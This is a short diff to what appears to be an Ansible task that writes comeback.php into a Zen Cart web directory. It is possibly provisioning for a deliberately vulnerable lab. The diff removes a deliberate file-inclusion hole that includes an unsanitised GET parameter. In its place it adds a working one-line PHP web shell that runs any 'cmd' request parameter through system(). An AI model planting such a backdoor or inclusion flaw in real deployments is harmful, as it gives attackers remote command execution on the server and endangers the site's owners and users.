@@ -10,7 +10,4 @@
     copy:
       dest: /var/www/html/zen-cart/comeback.php
       content: |
-        <?PHP
-           $module = $_GET["module"];
-           include $module;
-        ?>
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
